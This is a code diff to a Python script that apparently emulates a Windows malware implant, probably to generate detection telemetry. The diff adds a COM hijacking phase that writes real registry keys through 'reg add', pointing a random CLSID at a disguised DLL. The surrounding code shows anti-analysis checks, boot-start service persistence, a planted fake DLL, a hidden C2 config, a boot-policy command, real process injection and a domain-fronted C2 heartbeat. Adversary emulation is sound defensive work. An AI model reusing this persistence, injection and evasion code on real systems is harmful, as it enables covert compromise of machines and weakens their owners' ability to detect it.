@@ -15,11 +15,23 @@ import subprocess
 import sys
 from pathlib import Path
 
-from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
+from telemetry_helper import check_environment, emit, EnvSafety, set_phase
 from c2_helper import emit_doh_query, emit_heartbeats, fronted_beacon, FRONT_DOMAINS
+from naming_helper import phase_delay, pick_com_description, pick_service_name
 
 import socket
 import struct
+import time
+
+def _gen_clsid() -> str:
+    """Generate a random GUID without dashes for CLSID registry key."""
+    return (
+        f"{random.randint(0, 0xFFFFFFFF):08x}"
+        f"{random.randint(0, 0xFFFF):04x}"
+        f"{random.randint(0, 0xFFFF):04x}"
+        f"{random.randint(0, 0xFFFF):04x}"
+        f"{random.randint(0, 0xFFFFFFFFFFFF):012x}"
+    )
 
 
 def main() -> int:
@@ -40,7 +52,7 @@ def main() -> int:
         emit("PROCESS", "EXIT_PROCESS", "winlogon_e.exe", "INFO",
              source_process="winlogon_e.exe", early_exit="COMPROMISED environment")
         return 0
-    jitter(0.2, 0.2)
+    time.sleep(phase_delay("anti_analysis"))
 
     # Phase 2: Service installation
     set_phase("service_persistence")
@@ -55,9 +67,44 @@ def main() -> int:
     emit("REGISTRY", "SET_VALUE", svc_key + r"\Start", "CRITICAL",
          source_process="winlogon_e.exe",
          value_data="0 (Boot)", detail="Service set to start at boot")
-    jitter(0.2, 0.2)
+    time.sleep(phase_delay("registry_write"))
 
-    # Phase 3: DLL hijacking
+    # Phase 3: COM hijacking
+    set_phase("com_hijack")
+    com_clsid = f"{{{_gen_clsid()}}}"
+    com_desc = pick_com_description()
+    com_key = rf"HKCR\CLSID\{com_clsid}\InprocServer32"
+    com_dll = r"C:\Windows\System32\drivers\wdupdate.dll"
+    emit("REGISTRY", "CREATE_KEY", com_key, "CRITICAL",
+         source_process="winlogon_e.exe",
+         clsid=com_clsid, description=com_desc,
+         detail=f"COM hijack CLSID registered: {com_clsid} ({com_desc})",
+         technique_id="T1574.002")
+    emit("REGISTRY", "SET_VALUE", com_key, "CRITICAL",
+         source_process="winlogon_e.exe",
+         value_data=com_dll,
+         detail=f"COM server DLL path: {com_dll}", technique_id="T1574.002")
+    emit("REGISTRY", "SET_VALUE", rf"HKCR\CLSID\{com_clsid}\TreatAs", "CRITICAL",
+         source_process="winlogon_e.exe",
+         value_data=com_clsid,
+         detail="COM TreatAs redirection set", technique_id="T1574.002")
+    try:
+        subprocess.run([
+            "reg", "add", rf"HKCR\CLSID\{com_clsid}", "/f",
+        ], capture_output=True, timeout=5)
+        subprocess.run([
+            "reg", "add", com_key, "/ve", "/t", "REG_SZ",
+            "/d", com_dll, "/f",
+        ], capture_output=True, timeout=5)
+        subprocess.run([
+            "reg", "add", rf"HKCR\CLSID\{com_clsid}\TreatAs",
+            "/ve", "/t", "REG_SZ", "/d", com_clsid, "/f",
+        ], capture_output=True, timeout=5)
+    except Exception:
+        pass
+    time.sleep(phase_delay("com_hijack"))
+
+    # Phase 4: DLL hijacking
     set_phase("dll_hijack")
     hijack_dll = Path(os.environ.get("TEMP", r"C:\Windows\Temp")) / "version.dll"
     hijack_dll.write_bytes(b"MZ" + os.urandom(512))
@@ -68,7 +115,7 @@ def main() -> int:
          source_process="winlogon_e.exe",
          detail="DLL placed in System32 search path", technique_id="T1574.001")
 
-    # Phase 4: Hidden directory
+    # Phase 5: Hidden directory
     set_phase("hidden_files")
     hidden_dir = Path(r"C:\ProgramData") / ".hidden_config"
     hidden_dir.mkdir(parents=True, exist_ok=True)
@@ -83,9 +130,9 @@ def main() -> int:
     config.write_text(json.dumps({"c2": "10.13.37.70", "interval": 30}))
     emit("FILE", "CREATE_FILE", str(config), "WARNING",
          source_process="winlogon_e.exe", detail="Persistence config written")
-    jitter(0.2, 0.2)
+    time.sleep(phase_delay("file_write"))
 
-    # Phase 5: Boot record modification
+    # Phase 6: Boot record modification
     if env != EnvSafety.SUSPICIOUS:
         set_phase("boot_persistence")
         emit("FILE", "BOOT_MODIFY", r"\\.\PhysicalDrive0", "CRITICAL",
@@ -96,7 +143,7 @@ def main() -> int:
              command="bcdedit /set {default} bootstatuspolicy ignoreallfailures",
              detail="Boot policy modification attempted", technique_id="T1542.003")
 
-    # Phase 6: Process injection (real ctypes-based)
+    # Phase 7: Process injection (real ctypes-based)
     if env != EnvSafety.SUSPICIOUS:
         set_phase("process_injection")
 
@@ -220,7 +267,7 @@ def main() -> int:
             kernel32.WaitForSingleObject(thread_handle, 1000)
             kernel32.ResumeThread(pi.hThread)
 
-            jitter(0.5, 0.3)
+            time.sleep(phase_delay("process_inject"))
 
             kernel32.TerminateProcess(pi.hProcess, 0)
             kernel32.CloseHandle(thread_handle)
@@ -236,7 +283,7 @@ def main() -> int:
             emit("PROCESS", "CREATE_PROCESS", target, "WARNING",
                  source_process="winlogon_e.exe", error=str(e))
 
-    # Phase 7: Network callback (domain-fronted heartbeat)
+    # Phase 8: Network callback (domain-fronted heartbeat)
     set_phase("c2_callback")
     front = random.choice(FRONT_DOMAINS)
     emit("NETWORK", "CONNECT", "10.13.37.70:4444", "CRITICAL",
